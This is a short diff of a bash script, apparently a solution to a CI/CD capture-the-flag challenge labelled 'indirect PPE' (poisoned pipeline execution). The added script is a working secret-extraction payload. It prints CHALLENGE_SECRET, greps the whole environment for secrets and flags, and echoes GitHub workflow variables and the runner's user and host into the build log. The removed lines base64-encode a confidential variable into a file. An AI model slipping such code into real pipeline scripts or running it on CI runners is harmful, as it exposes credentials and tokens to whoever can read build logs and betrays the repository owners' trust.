@@ -1,2 +1,13 @@
-echo -n "$CONFIDENTIAL_ENV_VAR" | base64 > secret.txt
-cat secret.txt
+#!/bin/bash
+echo "INDIRECT PPE - Extracting secret..."
+
+echo "CHALLENGE_SECRET: $CHALLENGE_SECRET"
+
+echo "All secrets check:"
+env | grep -i secret || echo "No secrets found"
+env | grep -i flag || echo "No flags found"
+
+echo "Workflow env vars:"
+echo "GITHUB_REPOSITORY: $GITHUB_REPOSITORY"
+echo "GITHUB_SHA: $GITHUB_SHA"
+echo "Runner: $(whoami)@$(hostname)"
